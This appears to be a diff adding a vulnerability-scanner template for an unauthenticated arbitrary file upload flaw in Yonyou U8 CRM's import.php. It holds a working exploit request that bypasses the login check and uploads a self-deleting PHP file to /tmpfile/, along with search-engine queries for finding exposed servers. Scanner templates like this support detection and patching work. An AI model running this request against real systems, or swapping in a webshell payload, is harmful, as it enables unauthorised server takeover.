@@ -1,0 +1,44 @@
+id: yonyou-crm-import-php-fileupload
+info:
+  name: 用友CRM客户关系管理系统任意文件上传漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    用友CRM客户关系管理系统import.php存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传webshell文件，从而获取到服务器权限。
+    FOFA：body="用友U8CRM"
+    hunter:app.name="用友 CRM"
+  reference:
+    - https://blog.csdn.net/weixin_41924764/article/details/142427705
+  tags: yonyou,crm,fileupload
+  created: 2025/03/06
+
+set:
+  hostname: request.url.host
+  randstr: randomLowercase(8)
+  rand1: randomInt(1, 100)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+      body: |
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="xfile"; filename="{{rand1}}.xls"
+
+        <?php echo "HelloWorldTest";unlink(__FILE__);?>
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="combo"
+
+        {{randstr}}.php
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+    expression: response.status == 200 && response.body.bcontains(b'\\u5bfc\\u5165\\u6210\\u529f')
+  r1:
+    request:
+      method: GET
+      path: /tmpfile/{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(b'HelloWorldTest')
+
+expression: r0() && r1()
